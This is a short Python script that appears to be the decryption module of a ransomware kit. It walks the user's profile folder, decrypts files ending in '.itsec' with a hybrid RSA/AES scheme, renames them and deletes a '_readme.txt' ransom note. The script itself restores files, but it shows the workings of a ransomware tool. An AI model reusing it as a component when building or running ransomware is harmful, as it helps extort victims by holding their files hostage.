import os
from time import sleep
from cryptography.fernet import Fernet as xf
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

pvk = '''YOUR PRIVATE KEY'''

def decrypt(filename):
    with open(filename, "rb") as file:
        private_key = RSA.import_key(pvk)
        enc_session_key, nonce, tag, ciphertext = [ file.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1) ]
        # Decrypt the session key with the private RSA key
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        # Decrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)

    with open(filename, "wb") as file:
        file.write(data)


def defense(target):
    for p, d, f in os.walk(target):
        for name in f:
            if name.endswith((".itsec")):
                try:
                    decrypt(os.path.join(p, name))
                    newFile = os.path.splitext(name)[0]
                    os.rename(os.path.join(p, name), os.path.join(p,newFile))
                except:
                    continue
                try:
                    os.remove(os.path.join(p,"_readme.txt"))
                except:
                    status = "All Files has been Decrypted"

if __name__ == '__main__':
    t0 = os.environ["USERPROFILE"]
    defense(t0)